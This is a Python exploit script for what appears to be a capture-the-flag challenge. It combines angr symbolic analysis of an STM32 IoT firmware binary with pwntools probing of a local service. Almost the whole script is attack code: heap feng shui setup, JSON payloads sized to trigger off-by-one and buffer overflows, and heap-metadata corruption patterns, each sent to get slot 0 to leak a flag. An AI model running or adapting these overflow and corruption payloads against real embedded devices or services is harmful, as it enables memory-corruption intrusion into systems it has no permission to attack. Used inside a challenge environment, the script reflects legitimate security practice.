#!/usr/bin/env python3

import angr
import claripy
import json
import socket
import time
import struct
from pwn import *

def heap_feng_shui_setup(host, port):
    """Set up heap feng shui with slot 1 comparison [69,2,0]"""
    try:
        r = remote(host, port)
        
        # Heap feng shui: start with slot 1 comparison to set up heap layout
        feng_shui_cmd = {"slot": 1, "data": [69, 2, 0]}
        cmd_str = json.dumps(feng_shui_cmd)
        print(f"Heap feng shui setup: {cmd_str}")
        r.sendline(cmd_str)
        response = r.recv()
        print(f"Feng shui response: {response}")
        
        return r
    except Exception as e:
        print(f"Heap feng shui setup failed: {e}")
        return None

def analyze_heap_allocation_with_angr():
    """Use angr to analyze the heap allocation patterns in the binary"""
    print("=== Angr Static Analysis ===")
    
    # Load the STM32 binary
    binary_path = "/Users/saumil/codex/dist/csit_iot.bin"
    proj = angr.Project(binary_path, 
                       auto_load_libs=False,
                       main_opts={'base_addr': 0x08000000})  # STM32 ROM base
    
    print(f"Binary loaded at base: {hex(proj.loader.main_object.mapped_base)}")
    
    # Key addresses from our analysis
    json_parser_addr = 0x08007260  # FUN_08007260 - main JSON parser
    heap_alloc_addr = 0x08008466   # FUN_08008466 - heap allocation function
    
    # Create initial state at the JSON parser
    state = proj.factory.entry_state(addr=json_parser_addr)
    
    # Set up symbolic input for JSON command
    # This represents the JSON command buffer that gets processed
    json_input_size = 512  # Start with reasonable buffer size
    json_input = claripy.BVS("json_input", json_input_size * 8)
    
    # Constrain the input to be printable JSON-like characters
    for i in range(json_input_size):
        byte = json_input.get_bytes(i, 1)
        state.solver.add(claripy.Or(
            claripy.And(byte >= ord(' '), byte <= ord('~')),  # Printable ASCII
            byte == ord('\n'),  # Newline
            byte == ord('\t')   # Tab
        ))
    
    return proj, state, json_input

def find_heap_overflow_conditions():
    """Use angr to find conditions that trigger heap overflow"""
    print("=== Finding Heap Overflow Conditions with Angr ===")
    
    try:
        proj, state, json_input = analyze_heap_allocation_with_angr()
        
        # Set up simulation manager
        simgr = proj.factory.simulation_manager(state)
        
        # Key addresses we want to analyze
        heap_alloc_addr = 0x08008466  # Heap allocation function
        bounds_check_addr = 0x08007320  # Around the bounds check area
        
        # Look for paths that reach heap allocation with specific conditions
        print("Exploring execution paths...")
        
        # Explore for a limited number of steps to find allocation patterns
        simgr.explore(n=50, find=lambda s: s.addr == heap_alloc_addr)
        
        if simgr.found:
            print(f"Found {len(simgr.found)} paths reaching heap allocation")
            
            # Analyze the found states to understand allocation patterns
            for i, found_state in enumerate(simgr.found[:3]):  # Analyze first 3 paths
                print(f"\nAnalyzing path {i+1}:")
                
                # Try to solve for input that reaches this state
                if found_state.solver.satisfiable():
                    try:
                        solution = found_state.solver.eval(json_input, cast_to=bytes)
                        print(f"Input that reaches heap alloc: {solution[:100]}...")
                        
                        # Look for patterns in the solution
                        solution_str = solution.decode('utf-8', errors='ignore')
                        if '{' in solution_str and '}' in solution_str:
                            print(f"Looks like JSON: {solution_str[:200]}...")
                    except Exception as e:
                        print(f"Could not solve for concrete input: {e}")
        
        return simgr
        
    except Exception as e:
        print(f"Angr analysis failed: {e}")
        return None

def test_specific_overflow_sizes(r):
    """Test specific buffer sizes that might cause overflow"""
    print("=== Testing Specific Overflow Sizes ===")
    
    # Based on the reallocation logic: iVar6 = uVar10 + 1 where uVar10 = capacity * 2
    # We need to find the exact size where off-by-one occurs
    
    critical_sizes = [
        15, 16, 17,    # Small buffer boundaries
        31, 32, 33,    # Next reallocation boundary
        63, 64, 65,    # Next boundary
        127, 128, 129, # Next boundary
        255, 256, 257  # Larger boundary
    ]
    
    for size in critical_sizes:
        print(f"Testing overflow size: {size}")
        
        # Create JSON command with specific buffer size
        # Target the command line parsing buffer, not the data array
        padding_key = "X" * size
        overflow_cmd = {"slot": 1, padding_key: "trigger_overflow"}
        
        try:
            cmd_str = json.dumps(overflow_cmd)
            print(f"Sending: {cmd_str[:100]}...")
            r.sendline(cmd_str)
            
            # Check for response or connection close
            try:
                response = r.recv(timeout=2)
                print(f"Response: {response}")
                
                # Test if overflow affected slot 0 access
                print("Testing slot 0 access after potential overflow...")
                r.sendline('{"slot":0}')
                slot0_response = r.recv(timeout=2)
                print(f"Slot 0 response: {slot0_response}")
                
                if b'TISC{' in slot0_response:
                    print(f"SUCCESS! Overflow at size {size} enabled slot 0 access!")
                    return True
                    
            except EOFError:
                print("Connection closed - possible crash!")
                return False
                
        except Exception as e:
            print(f"Error at size {size}: {e}")
            return False
        
        time.sleep(0.1)
    
    return False

def test_json_command_buffer_overflow(r):
    """Test overflow in the JSON command parsing buffer specifically"""
    print("=== Testing JSON Command Buffer Overflow ===")
    
    # The vulnerability is likely in the JSON command line parsing buffer
    # Not in the data array processing, but in the buffer that holds the entire JSON command
    
    # Try gradually increasing JSON command sizes
    base_sizes = [100, 200, 400, 800, 1000, 1500, 2000]
    
    for size in base_sizes:
        print(f"Testing JSON buffer size: {size}")
        
        # Create a JSON command that fills the parsing buffer
        # Use a mix of slot command and padding to reach exact sizes
        padding_needed = size - 50  # Account for JSON structure
        if padding_needed > 0:
            padding = "A" * padding_needed
            overflow_cmd = {"slot": 1, "overflow_key": padding}
        else:
            overflow_cmd = {"slot": 1}
        
        try:
            cmd_str = json.dumps(overflow_cmd)
            print(f"Command size: {len(cmd_str)} bytes")
            r.sendline(cmd_str)
            
            try:
                response = r.recv(timeout=3)
                print(f"Response: {response[:100]}...")
                
                # After potential overflow, test slot 0
                print("Testing slot 0 after overflow attempt...")
                r.sendline('{"slot":0}')
                slot0_response = r.recv(timeout=2)
                
                if b'TISC{' in slot0_response:
                    print(f"SUCCESS! Buffer overflow at size {size} worked!")
                    print(f"Flag response: {slot0_response}")
                    return True
                elif b'Out of bounds!' not in slot0_response:
                    print(f"Different response from slot 0: {slot0_response}")
                
            except EOFError:
                print("Connection closed - possible crash, trying new connection...")
                return False
                
        except Exception as e:
            print(f"Error at buffer size {size}: {e}")
            
        time.sleep(0.1)
    
    return False

def advanced_heap_exploitation(r):
    """Try advanced heap exploitation techniques"""
    print("=== Advanced Heap Exploitation ===")
    
    # Try to corrupt heap metadata by overflowing with specific patterns
    # Target heap chunk headers or adjacent allocations
    
    corruption_patterns = [
        # Pattern 1: Try to overwrite heap metadata with specific values
        # that might bypass the slot 0 check
        {"slot": 1, "heap_corruption": "A" * 1000 + "\x00" * 4},
        
        # Pattern 2: Try to corrupt the slot number variable itself
        {"slot": 1, "target_corruption": "B" * 500 + "\x41\x41\x41\x41"},
        
        # Pattern 3: Use repeated patterns to find the exact overflow offset
        {"slot": 1, "pattern_test": "ABCD" * 250},
    ]
    
    for i, pattern in enumerate(corruption_patterns):
        print(f"Trying corruption pattern {i+1}...")
        
        try:
            cmd_str = json.dumps(pattern)
            r.sendline(cmd_str)
            
            response = r.recv(timeout=2)
            print(f"Corruption response: {response}")
            
            # Test slot 0 access after each corruption attempt
            r.sendline('{"slot":0}')
            slot0_response = r.recv(timeout=2)
            
            if b'TISC{' in slot0_response:
                print(f"SUCCESS! Corruption pattern {i+1} worked!")
                print(f"Flag: {slot0_response}")
                return True
                
        except Exception as e:
            print(f"Error with pattern {i+1}: {e}")
            
        time.sleep(0.1)
    
    return False

def main():
    print("STM32 IoT Heap Exploitation with Angr")
    print("Target: Extract flag from slot 0")
    
    # First, use angr to analyze the binary and find overflow conditions
    print("Step 1: Static analysis with angr...")
    find_heap_overflow_conditions()
    
    # Now test the findings against the live target
    print("\nStep 2: Dynamic testing against live target...")
    
    # Set up heap feng shui and test overflow
    r = heap_feng_shui_setup('localhost', 8000)
    if not r:
        print("Failed to set up connection")
        return
    
    try:
        # Test different overflow techniques
        if test_specific_overflow_sizes(r):
            return
            
        # Reconnect for next test
        r.close()
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            return
            
        if test_json_command_buffer_overflow(r):
            return
            
        # Reconnect for advanced techniques
        r.close()
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            return
            
        if advanced_heap_exploitation(r):
            return
            
        print("All exploitation attempts failed. Need more specific targeting.")
        
    finally:
        if r:
            r.close()

if __name__ == "__main__":
    main()